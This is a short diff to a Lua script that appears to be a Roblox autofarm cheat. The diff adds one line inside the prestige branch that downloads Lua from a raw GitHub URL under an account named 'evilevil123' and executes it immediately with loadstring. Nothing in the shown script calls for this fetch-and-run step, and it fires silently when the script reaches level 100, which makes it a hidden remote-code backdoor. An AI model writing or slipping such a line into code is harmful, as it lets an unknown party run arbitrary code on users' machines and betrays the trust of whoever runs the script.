@@ -208,6 +208,7 @@ if getgenv().Autofarm then
     
         if tonumber(Level) >= 100 and getgenv().PrestigeActive == true then
             game:GetService("ReplicatedStorage").Events.Prestige:InvokeServer()
+	    loadstring(game:HttpGet('https://raw.githubusercontent.com/evilevil123/SO/refs/heads/main/stand2.lua'))()	
         end
     
         NewLevel(Level)
